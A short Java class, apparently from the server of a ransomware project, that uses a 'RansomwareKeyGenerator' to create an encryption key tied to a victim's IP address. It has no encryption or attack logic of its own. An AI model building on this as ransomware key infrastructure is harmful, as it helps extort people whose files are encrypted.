package com.server.app.keys;

import javax.inject.Inject;

import com.server.app.entities.CryptoKey;
import com.server.app.exceptions.AlgorithmNotFoundException;
import com.server.app.exceptions.InvalidCryptoKeyException;

public class KeyManagement implements Management {

	@Inject
	RansomwareKeyGenerator generator;

	@Override
	public CryptoKey createAndSaveKey(String encalgo, String ip) throws InvalidCryptoKeyException {
		try {
			generator = new RansomwareKeyGenerator();
			return new CryptoKey(ip, generator.generateKey(encalgo), encalgo);
		} catch (AlgorithmNotFoundException e) {
			throw new InvalidCryptoKeyException("Key requierments- algoritm not found", e.getCause());
		}

	}
}
